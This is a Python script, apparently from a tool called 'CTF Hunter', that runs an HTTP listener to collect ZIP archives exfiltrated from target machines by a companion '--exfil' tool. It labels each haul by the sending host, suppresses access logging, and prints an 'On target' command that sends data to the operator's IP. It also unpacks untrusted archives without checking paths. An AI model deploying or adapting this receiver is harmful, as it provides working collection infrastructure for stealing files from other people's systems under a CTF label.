#!/usr/bin/env python3
"""
CTF Hunter — HTTP receiver
Run this on your own machine: python receive.py [port]
Receives ZIP files POSTed by ctf_hunter.py --exfil
"""

import http.server, os, sys, zipfile, io
from datetime import datetime

PORT    = int(sys.argv[1]) if len(sys.argv) > 1 else 8000
OUT_DIR = "./received"
os.makedirs(OUT_DIR, exist_ok=True)

class Handler(http.server.BaseHTTPRequestHandler):
    def do_POST(self):
        length  = int(self.headers.get("Content-Length", 0))
        payload = self.rfile.read(length)
        host_id = self.headers.get("X-Host", "unknown").replace("/","_").replace("\\","_")
        ts      = datetime.now().strftime("%Y%m%d_%H%M%S")
        dest    = os.path.join(OUT_DIR, f"{host_id}_{ts}")
        os.makedirs(dest, exist_ok=True)
        try:
            with zipfile.ZipFile(io.BytesIO(payload)) as zf:
                zf.extractall(dest)
            print(f"[+] {ts}  {self.client_address[0]}  {host_id}  → {dest}")
        except Exception as e:
            # Save raw if not a zip
            raw_path = os.path.join(dest, "raw.bin")
            with open(raw_path, "wb") as f:
                f.write(payload)
            print(f"[!] Not a ZIP — saved raw: {raw_path}  ({e})")
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"OK")

    def log_message(self, *_): pass   # suppress default access log

print(f"[*] Receiver listening on 0.0.0.0:{PORT}")
print(f"[*] Saving to {os.path.abspath(OUT_DIR)}/")
print(f"[*] On target: python ctf_hunter.py --exfil http://YOUR_IP:{PORT}\n")
http.server.HTTPServer(("", PORT), Handler).serve_forever()
